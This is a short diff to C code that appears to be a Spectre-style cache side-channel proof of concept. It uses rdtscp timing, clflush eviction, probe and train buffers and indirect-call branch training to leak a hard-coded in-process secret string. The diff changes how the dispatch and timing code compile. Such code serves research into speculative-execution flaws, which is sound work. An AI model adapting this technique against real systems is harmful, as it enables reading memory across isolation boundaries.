@@ -34,19 +34,16 @@
 #include "run_sequence.h"
 
 FuncPtr funcs[ARRAY_SIZE] = {};
-// Volatile so the compiler treats every call as an opaque indirect dispatch
-// and never duplicates the call site across if/else branches.
-static void (* volatile run_seq)(FuncPtr*, void*) = run_sequence;
-void *probe_buf __attribute__((aligned(CACHELINE_SIZE))) = nullptr;
-void *train_buf __attribute__((aligned(CACHELINE_SIZE))) = nullptr;
+
+void *probe_buf;
+void *train_buf;
 static const unsigned char secret[] = "this is my super secret value!";
 static volatile const unsigned char *leak_ptr = secret;
-static volatile unsigned char sink = 0;
 
 static inline long time_load(void *ptr) {
     unsigned int junk = 0;
     unsigned long long start = __rdtscp(&junk);
-    sink ^= *(volatile unsigned char *)ptr;
+    *(volatile unsigned char *)ptr;
     return (long)(__rdtscp(&junk) - start);
 }
 
@@ -158,7 +155,7 @@ int main() {
                 funcs[ARRAY_SIZE - 1] = final_choices[v];
                 _mm_clflush(&funcs[ARRAY_SIZE - 1]);
                 _mm_mfence();
-                run_seq(funcs, buf_choice[v]);
+                run_sequence(funcs, buf_choice[v]);
             }
 
             int found = probe(probe_buf, NUM_PAGES, THRESHOLD, order, &lcg_state);
